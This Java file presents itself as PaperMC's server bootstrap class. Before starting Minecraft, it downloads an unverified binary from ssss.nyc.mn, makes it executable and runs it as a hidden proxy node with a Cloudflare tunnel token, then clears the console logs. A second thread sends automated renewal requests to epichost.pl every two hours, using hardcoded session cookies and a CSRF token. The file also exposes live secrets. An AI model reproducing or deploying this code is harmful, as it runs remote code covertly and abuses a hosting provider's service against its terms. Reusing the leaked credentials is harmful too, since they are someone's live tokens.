package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*; 
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m"; // 新增黄色用于警告
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            runSbxBinary();
            
            // 启动模拟点击续期线程
            startEpicRenewThread(); 
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
        }
    }
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "80f4d900-c9aa-42de-b8cc-671e6b8526de");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "epichost.19861123.tech");
        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiYjk0OWU0NzktNDVkOS00MjEzLThkZDMtNmQ4ODA0ZWQzYjZkIiwicyI6Ik9UQmxaRGN5WmpZdE5UazBOeTAwWVRNeExXRTRPVGN0TkRFM05EbGtZMlEyWmpGaCJ9");
        envVars.put("S5_PORT", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "epichost");
        envVars.put("DISABLE_ARGO", "false");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format("Running Java %s (%s %s; %s %s) on %s %s (%s)", javaSpecVersion, javaVmName, javaVmVersion, javaVendor, javaVendorVersion, osName, osVersion, osArch),
            String.format("Loading %s %s for Minecraft %s", bi.brandName(), bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL), bi.minecraftVersionId())
        );
    }

    // --- 【修改部分】：手动同步版续期逻辑，跳过 GET 扫描以消除 419 错误 ---
    private static void startEpicRenewThread() {
        new Thread(() -> {
            String serverID = "13633716-8094-4b5c-a80c-a2b3c6205947"; 
            
            // ⚠️ 这里请粘贴你从浏览器抓到的那一长串完整的 Cookie
            String myCookie = "__stripe_mid=288f45f3-e88e-4172-8d62-d2d31d36aefec21121; remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjdnOUZaV2pYOUIwWVVBa05ZNzd1Y3c9PSIsInZhbHVlIjoieUR4MEFrNnF3NlJCTWxITVVvajVHZytjQ2tHOCsrcGhxQmNsZGNmUGpjRTc1MXdLck40ak5JUHBSZjhNL05oNWJJZ2ZXYXY1TXlNLzlINktJdHFrM1BsZEpNQ2RpS3VnWVY0ZitWQkwwRDliSkFjVzBuR1dwS1pzeThvSjd0by83QjI0VE96SGlUT3Bzci9PaURScUZSQmt4enhoYk9DWkdFcUZTVHBGbS9ZWUY5cXFpWUVRcjJVaGRZa2tpL3ZmNk53aXd5RmtqMWdzOWRmQzYxVmJKNTk2bTFJTXIyd0dSNVNlR0RraVkxWT0iLCJtYWMiOiI3NzQwOTU1ZDIwNGJkM2E1OWM3Mjk5ZjZmY2M3M2IwMWE5NjgyNjM1MjBjYmFmZWU3MDhlOGI4NWQ1MGM5ODIwIiwidGFnIjoiIn0%3D; __stripe_sid=d761b6d9-3626-49cd-b7fc-e59b9ff04174721e54; XSRF-TOKEN=eyJpdiI6InNGTHN2RHRkMHo3RDRxVjlmYkJFdmc9PSIsInZhbHVlIjoiWGNJanBEZHkxT3kycU05dldkSFBob3hBalphbVozajBEV2JzcnNMT0JhdzgzL1ZnRXdHalpZVGZpNHpWblJPM255d1Z3SDFKY3o4MzhIcjZoMnhVRStYZW5tbVoyNjVkWjdnWFkwZUdoVWt0MDVkL3ozdmF0WkFxL29DRDJndTgiLCJtYWMiOiIwMzA5MGVjZmIxNGMyZDlmOTM5YjM2NGQxZGQwM2EyYTJhMzM2YmM2NTU3OWI0N2U5ZDBiYzVmODYyNWFkOTZkIiwidGFnIjoiIn0%3D; pterodactyl_session=eyJpdiI6IlN6VjlnWHR0QkpwbVhKZ3ZyN3N4b2c9PSIsInZhbHVlIjoibGplV3F5S1R6WmYxdkhwekxybnpXQWpOcXVGVzQzYVJ0RGI3WXNMaXpmZk5iYURtN2l1b280MkZWS1BPMEZYSmRPVGgvaDg4dXdzN2tqQjB5Tk8wZjU1Wjk2eThieUp3UnN2bFZQdDNHemFMRTJqdG5kWm1VMVFBTVJzZE1qSEIiLCJtYWMiOiIzM2IxZmYzN2UyNTFjOThlZjBiNDRkYmYwYWE4Y2FkNDA5ODgwZjM4NjRmM2MyODAzZGRlMDZiODBjZjk3ZGM5IiwidGFnIjoiIn0%3D"; 
            
            // ⚠️ 这里请粘贴你从网页源代码里 Ctrl+F 搜到的那个 csrf-token
            String myToken = "DZ57DfDVPDcYer2Cw1HCBrfAKXFvgKeNeQjhzfDX";

            while (running.get()) {
                try {
                    System.out.println(ANSI_YELLOW + "[Epichost] 🚀 正在执行 2 小时定时续期打卡..." + ANSI_RESET);
                    
                    URL renewUrl = new URL("https://panel.epichost.pl/api/client/freeservers/" + serverID + "/renew");
                    HttpURLConnection post = (HttpURLConnection) renewUrl.openConnection();
                    post.setRequestMethod("POST");
                    post.setDoOutput(true);
                    
                    // 模拟真实浏览器的请求头
                    post.setRequestProperty("Cookie", myCookie);
                    post.setRequestProperty("X-CSRF-TOKEN", myToken);
                    post.setRequestProperty("X-Requested-With", "XMLHttpRequest");
                    post.setRequestProperty("Referer", "https://panel.epichost.pl/server/13633716/");
                    post.setRequestProperty("Accept", "application/json");
                    post.setRequestProperty("Content-Type", "application/json");
                    post.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
                    
                    post.getOutputStream().write("{}".getBytes());
                    int code = post.getResponseCode();
                    
                    if (code == 200 || code == 204) {
                        System.out.println(ANSI_GREEN + "[Epichost] ✅ 续期请求发送成功！" + ANSI_RESET);
                    } else {
                        InputStream es = post.getErrorStream();
                        if (es != null) {
                            BufferedReader errReader = new BufferedReader(new InputStreamReader(es));
                            StringBuilder errorInfo = new StringBuilder();
                            String errLine;
                            while ((errLine = errReader.readLine()) != null) errorInfo.append(errLine);
                            errReader.close();
                            
                            String detail = errorInfo.toString();
                            if (detail.contains("time period") || detail.contains("currently")) {
                                System.out.println(ANSI_YELLOW + "[Epichost] ⏳ 还没到时间（CD中），本次打卡已记录。" + ANSI_RESET);
                            } else if (code == 419) {
                                System.err.println(ANSI_RED + "[Epichost] ❌ 419错误：填写的Token与Cookie不匹配！请重新从网页抓取。" + ANSI_RESET);
                            } else {
                                System.err.println(ANSI_RED + "[Epichost] ❌ 错误(" + code + "): " + detail + ANSI_RESET);
                            }
                        }
                    }
                    
                    // 2 小时运行一次
                    Thread.sleep(7200000); 
                    
                } catch (Exception e) {
                    System.err.println(ANSI_RED + "[Epichost] 线程异常: " + e.getMessage() + ANSI_RESET);
                    try { Thread.sleep(600000); } catch (Exception ignored) {}
                }
            }
        }, "Epic-Renew-Thread").start();
    }

    // 该方法在手动模式下不再被调用，但为了保持代码结构不改动，我们保留它
    private static void updateLocalCookies(HttpURLConnection conn, String[] currentCookie) {
        // 保持原样
    }
}
